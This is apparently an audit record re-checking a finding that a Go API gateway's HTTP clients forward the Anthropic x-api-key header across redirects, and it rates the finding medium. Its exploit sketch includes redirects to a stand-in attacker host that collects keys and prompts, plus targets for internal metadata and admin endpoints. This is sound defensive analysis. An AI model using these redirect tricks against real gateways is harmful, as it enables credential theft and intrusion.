verification.date_context: read-only re-audit of finding gateway-2 as filed in docs/security/raw/audit-gateway.json lines 14-25

finding.title: No CheckRedirect on gateway/health/testProvider HTTP clients: x-api-key (Anthropic provider key) survives Go's cross-host redirect strip → key exfiltration by malicious upstream
finding.evidence: adapter.go:679 `req.Header.Set("x-api-key", apiKey)` — the decrypted provider key (runtime/manager.go:213-215 decrypts into the snapshot). gateway.go:58-60 `httpClient: &http.Client{Transport: &http.Transport{` — no CheckRedirect, so Go's default (GOROOT src/net/http/client.go:819-824 `if len(via) >= 10 { return errors.New("stopped after 10 redirects") }`) follows up to 10 redirects. Verified against the toolchain (go1.24.4, module go directive 1.25): client.go:805-814 copies redirect-forwarded headers but strips only `case "Authorization", "Www-Authenticate", "Cookie", "Cookie2", "Proxy-Authorization", "Proxy-Authenticate":` when cross-host — x-api-key and anthropic-version are NOT in that list and are resent verbatim to any redirect target; and client.go:991-1007 `shouldCopyHeaderOnRedirect` keeps even Authorization for parent-domain/subdomain redirects (open-redirect on a sibling host suffices). Same client config in health.go:38 `client: &http.Client{Timeout: 10 * time.Second}` and providers.go:184/232 `client := &http.Client{Timeout: 15 * time.Second}`.
finding.impact: A malicious, compromised, or misconfigured Anthropic-protocol upstream (common: third-party reseller endpoints added via admin UI) returns 302 Location: https://attacker.example/collect and the gateway replays the provider API key there on every generation AND on every 3-10s health probe (health.go sends the decrypted key too). 307/308 also re-POST the tenant's full prompt payload to the attacker host. Provider keys are the gateway's most sensitive credentials (shared, multi-tenant).
finding.recommendation: Set CheckRedirect on all three clients to refuse hops that change host/scheme or target private/loopback/link-local ranges; or pin to one hop. At minimum, delete x-api-key/anthropic-version on cross-host redirects the way stdlib does for Authorization.
finding.mitigations_checked: Confirmed Go >=1.8 strips Authorization cross-host (so openai_chat upstreams are partially protected — the asymmetry is the gap); keys are AES-GCM encrypted at rest (crypto.go:36-41) but decrypt to plaintext in the snapshot used here; no redirect observed in normal provider traffic, so silent exfil is persistent.

reason.1_evidence_integrity_ALL_CITATIONS_VERIF: Every quoted line matches byte-for-byte at the stated number. adapter.go:679 is exactly `req.Header.Set("x-api-key", apiKey)` (inside buildAnthropicRequest; anthropic-version is set at :680). gateway.go:58-60 is exactly `httpClient: &http.Client{Transport: &http.Transport{` / `MaxIdleConns: 200, MaxIdleConnsPerHost: 64, IdleConnTimeout: 90 * time.Second,` / `}},` — pooling knobs only, no CheckRedirect field, and this is the client actually used on the forwarding path (gateway.go:517 `resp, err := s.httpClient.Do(req)`) with the request built at gateway.go:507 `req, err := adapter.BuildUpstreamRequest(up.Protocol, cr, up.UpstreamModel, up.BaseURL, up.APIKey)`. health.go:38 `client: &http.Client{Timeout: 10 * time.Second}}` and providers.go:184 / providers.go:232 `client := &http.Client{Timeout: 15 * time.Second}` are exact. runtime/manager.go:212-220 decrypts each provider key into the snapshot (`if plain, err := m.enc.Decrypt(p.APIKeyEnc); err == nil {` at :214, `p.APIKey = plain` at :215). Repo-wide grep for `CheckRedirect` returns zero hits under backend/ (only in docs/security/raw/*), so the absence claim holds for all four client constructions. The finding is not misquoted and not wrong-line.
reason.2_stdlib_mechanics_CONFIRMED_AGAINST_INS: Environment verified: `go version go1.24.4 windows/amd64`, GOROOT C:\Program Files\Go, GOTOOLCHAIN=auto; backend/go.mod declares `go 1.25`, so go1.24.4's net/http is the code that runs here. GOROOT/src/net/http/client.go:819-824 `func defaultCheckRedirect(req *Request, via []*Request) error { if len(via) >= 10 { return errors.New("stopped after 10 redirects") }` — matches. The redirect header-copy loop at client.go:805-815 gates on `case "Authorization", "Www-Authenticate", "Cookie", "Cookie2",` / `"Proxy-Authorization", "Proxy-Authenticate":` (client.go:808-809) with `if !(sensitive && stripSensitiveHeaders) { req.Header[k] = vv }` (client.go:812-814); x-api-key and anthropic-version are absent from that list, so they ARE resent verbatim to any hop, cross-host included. client.go:682-686 `if !stripSensitiveHeaders && reqs[0].URL.Host != req.URL.Host { if !shouldCopyHeaderOnRedirect(reqs[0].URL, req.URL) { stripSensitiveHeaders = true } }` plus client.go:991-1007 shouldCopyHeaderOnRedirect → client.go:1014-1031 isDomainOrSubdomain confirms Authorization survives parent/sub-domain hops. Body replay is also real: adapter.go:674 `req, err := http.NewRequest(http.MethodPost, joinURL(baseURL, path), bytes.NewReader(b))` gives Request.GetBody, which client.go:669-675 uses to re-POST on 307/308. So all technical assertions hold; the only non-stdlib assertion is that gateway.go:529 `if resp.StatusCode < 200 || resp.StatusCode >= 300 {` inspects only the FINAL response, so a followed hop is invisible in logs/audit.
reason.3_CHAIN_BREAK_a_attacker_already_holds_t: The impact statement's adversary is the upstream itself ('A malicious, compromised, or misconfigured Anthropic-protocol upstream ... third-party reseller endpoints added via admin UI'). That host receives the decrypted provider key in the x-api-key header of the INITIAL request on every single generation (gateway.go:507 → adapter.go:679) and receives the tenant's full prompt body in the same request (faithful passthrough, a stated user design decision the audit rules say to judge only for security impact). A malicious or compromised reseller therefore reads the key from its own inbound request log without emitting any redirect; the 302 grants that actor exactly zero additional capability. The high band requires either unauthenticated exposure or an authz/privilege escalation; here the described exfiltration is a transfer the attacker is already the intended recipient of, so the escalation is absent by construction.
reason.4_CHAIN_BREAK_b_the_only_novel_recipient: The residual case where a redirect genuinely adds exposure is when the redirect target is NOT the upstream: a legit-but-vulnerable provider host with an open redirect, a provider account takeover where the operator keeps serving traffic, or a cleartext `http://` base_url where an on-path party injects a 302 (and in that last case the key is already in cleartext in the original request, so again nothing new). None of these preconditions is demonstrated for any real Anthropic-protocol endpoint; the finding's own mitigations_checked concedes 'no redirect observed in normal provider traffic'. This is the classic 'no CheckRedirect set' defense-in-depth gap — real, locatable, worth fixing — but conditional on a third-party behaviour the code neither induces nor is known to occur.
reason.5_CHAIN_BREAK_c_health_probe_sub_claim_i: The impact text asserts the key is replayed 'AND on every 3-10s health probe (health.go sends the decrypted key too)'. Two errors. (i) health.go:104 is `req.Header.Set("Authorization", "Bearer "+k)` — not x-api-key — so on precisely the cross-host hop posited (Location: https://attacker.example/collect, a different Host from reqs[0].URL.Host) client.go:682-686 flips stripSensitiveHeaders and client.go:812-814 drops the header: the probe leaks NOTHING cross-host, and the same-domain case it does cover is intentional stdlib semantics, not a defect in this repo. (ii) The cadence is not '3-10s': it is HEALTH_CHECK_SECONDS, default 30 (config.go:24 comment, config.go:71 `HealthCheckSeconds: getenvInt("HEALTH_CHECK_SECONDS", 30),`), 0 = disabled, wired at cmd/server/main.go:79. The 3s figure is hot_reload_seconds (manager.go:169-175), a different subsystem.
reason.6_BLAST_RADIUS_BOUNDARIES_CHECKED_NO_LAT: Checked for amplification that would justify high: (a) Tenant credentials never enter the upstream request — BuildUpstreamRequest creates a brand-new *http.Request via http.NewRequest (adapter.go:555, adapter.go:674) and sets only Content-Type / x-api-key / anthropic-version (:559-560, :678-680); the gateway adds only X-Request-ID (gateway.go:514). The inbound Authorization / x-api-key carrying the tenant sk- key is never copied, so a hop cannot harvest tenant keys. (b) Cross-provider leakage is impossible: each hop inherits only the headers of the initial request built for one provider (per-attempt request at gateway.go:507 inside the failover loop at :447), so a redirect exposes at most that one provider's key, never a peer provider's. (c) There is no admin read-back of plaintext keys to compare against — model.go:107-109 (`APIKeyEnc string `gorm:"type:text" json:"-"``, `APIKey string `gorm:"-" json:"-"``, APIKeyMasked), providers.go:22 `APIKey string `json:"-" // 不输出明文``, providers.go:81 / :130 clear APIKeyEnc before responding — so the gap is one of the few egress paths, but only for an actor who can make the endpoint redirect. (d) The testProvider/probeAnthropicMessages clients (providers.go:184, :230-232) are reachable only by an authenticated admin who just supplied both the base_url and the key themselves (providers.go:163 `key, _ := s.enc.Decrypt(p.APIKeyEnc)`), so they add no privilege beyond the admin's own configuration choice.
reason.7_DOUBLE_COUNTING_WITH_GATEWAY_3: The SSRF half of this finding ('redirect into private/loopback/link-local') is the compounding factor of the same auditor's gateway-3, which is filed at medium and whose mitigations_checked literally says 'redirect-based internal reach compounds this (see gateway-2)'. gateway-3 already covers unvalidated base_url (providers.go:56 only requires non-empty), the missing dial-time IP pinning, and the tenant-visible error oracle. Rating the redirect sub-vector high on top of that double-books the same impact.
reason.8_WHAT_SURVIVES_and_why_medium: Survives as a genuine, code-located defense-in-depth gap with real (if conditional) impact: an admin-provisioned Anthropic provider key — the one credential class with no read-back path at all — plus optionally the tenant prompt, can be replayed by the gateway to an arbitrary http/https destination of the endpoint's choosing, up to 10 chained hops (client.go:819-824), including RFC1918/loopback/link-local since nothing pins dial IPs (gateway.go:58-61 Transport has only pooling fields; no custom DialContext), and silently: gateway.go:529 checks only the final status, so a 2xx arriving from the redirect target is served as a normal completion and only `ap.upstreamProvider` records the original provider. The openai_chat/openai_responses paths are protected only by the stdlib accident that they use Authorization (adapter.go:560), which is exactly the asymmetry the finding identifies — that asymmetry is the correct, defensible core of the report. Fix as recommended: set CheckRedirect on gateway.go:58, health.go:38, providers.go:184 and providers.go:232 — the cheapest correct form is `CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }`, which makes gateway.go:529 surface any 3xx as an upstream error and fail over — or re-validate scheme/host-change/private-range per hop, and Del("x-api-key")/Del("anthropic-version") whenever the hop's Host differs from reqs[0].URL.Host, mirroring client.go:808-814.
reason.9_verdict_rationale: Not refuted: all five cited locations are exact, the stdlib behaviour was independently verified against the toolchain that actually compiles this module, the absence of CheckRedirect is repo-wide, and the header-asymmetry is a real weakness worth a ticket. Not high: the stated primary impact (key exfiltration by a malicious upstream) transfers a credential the attacker already holds on every request, the health-probe vector is wrong in both header name and interval, and there is no tenant-credential or cross-provider amplification. Medium = defense-in-depth gap with real impact, consistent with the sibling gateway-3 it compounds.

exploit_sketch:
Precondition the finding never establishes, stated up front: the redirect must be emitted by a host that is NOT itself the attacker, because the attacker-upstream already receives the key directly.

1) Admin registers a provider via the console: POST /api/admin/v1/providers with {"name":"claude-reseller","protocol":"anthropic","base_url":"https://reseller.example/claude","api_key":"sk-ant-..."} (providers.go:47-84; only non-emptiness and the protocol enum are checked at providers.go:56-63, so any host/scheme-to-URL is accepted).
2) A tenant calls the gateway: POST /v1/messages with Authorization: Bearer sk-<tenant-key>. gateway.go:507 builds the upstream request with the decrypted reseller key, adapter.go:679 putting it in `x-api-key: sk-ant-...` and :674 putting the tenant JSON into a *bytes.Reader body.
3) reseller.example answers that POST with `HTTP/1.1 302 Found` / `Location: https://collector.attacker.example/c`. gateway.go:58's client has no CheckRedirect, so client.go:819-824 permits up to 10 hops; client.go:682-686 sees reqs[0].URL.Host != collector.attacker.example so it would strip sensitive headers — but client.go:808-809 does not classify x-api-key or anthropic-version as sensitive, and client.go:812-814 copies them anyway.
4) collector.attacker.example receives `x-api-key: sk-ant-...` on that GET. If the endpoint instead answers `307 Temporary Redirect`, client.go:669-675 uses the Request.GetBody set by adapter.go:674's bytes.NewReader and re-POSTs the tenant's entire prompt to the attacker host; whatever JSON that host returns with 200 passes gateway.go:529 and is delivered to the tenant as a normal completion, so nothing is logged as an error and the leak recurs on every generation.
5) Same shape reaches internal space: `Location: http://169.254.169.254/latest/meta-data/...` or `http://127.0.0.1:8788/api/admin/v1/...` is dialed by the gateway with the provider key attached, since nothing pins resolved IPs (gateway.go:58-61 Transport sets pooling only).

Why this is medium, not high: steps 3-4 leak the reseller key and tenant prompt to a third host only if reseller.example redirects for reasons unrelated to attacking us (compromise of a provider the admin trusted, an open redirect on the provider's own origin, a chain-of-CDN hop). If reseller.example is itself hostile, it never needs step 3 — it already sees `x-api-key` and the full prompt in step 2's request. The health-probe variant does not work at all: health.go:104 sends `Authorization: Bearer <key>`, which client.go:808-814 strips on that same cross-host hop, and the probe interval is 30s (config.go:71), not 3-10s.
mitigations_confirmed_present: Go stdlib strips Authorization/Www-Authenticate/Cookie/Cookie2/Proxy-Authorization/Proxy-Authenticate on cross-host redirects (client.go:808-814) — so openai_chat/openai_responses upstream keys (adapter.go:560) and the health probe key (health.go:104) are NOT leaked cross-host.
Tenant inbound credentials are never forwarded: the upstream request is built fresh via http.NewRequest (adapter.go:555, :674) and only X-Request-ID is added (gateway.go:514).
No cross-provider key contamination: each failover attempt builds its own request per provider (gateway.go:447-463, :507).

Keys are AES-GCM encrypted at rest (crypto.go:34-41) and never serialized by any admin response (model.go:107-109, providers.go:22/81/130), so the plaintext exists only in the runtime snapshot (manager.go:212-220).

Per-request context deadline still applies on the non-stream path (gateway.go:497-505) and client timeouts bound health.go:38 / providers.go:184 / :232, so a hostile redirect target cannot hold the worker indefinitely (stream path is unbounded by stated design).
Unsupported schemes (file://, gopher://) are refused by net/http, so redirect targets are confined to http/https.
mitigations_absent: No CheckRedirect anywhere under backend/ (repo-wide grep: zero hits in Go sources).
No dial-time IP pinning / private-range blocking on the gateway Transport (gateway.go:58-61) or on the health/admin clients (health.go:38, providers.go:184, :232).
No base_url validation beyond non-emptiness (providers.go:56-63, :105-110), so the initial target is as unconstrained as the hop target.
No x-api-key/anthropic-version strip on host change — the stdlib's Authorization protection is not extended to the non-RFC header the Anthropic protocol actually uses.

No visibility: gateway.go:529 inspects only the final status after redirects, and CallLog stores the configured provider name (gateway.go:526), so a followed hop is indistinguishable from normal traffic in audit/metrics.
recommendation_verdict: Recommendation is technically sound and should be kept; amend the impact narrative (drop the health-probe vector, or fix it to note health.go uses Authorization and 30s default; and note the malicious-upstream case is not an escalation). Preferred fix ordering: (1) gateway.go:58 client — `CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }` so any 3xx becomes an upstream error at gateway.go:529 and fails over; (2) same for providers.go:184/:232 and health.go:38; (3) shared URL guard with scheme + private-range rejection and per-hop re-validation, which is gateway-3's remediation and should be filed once, not twice.
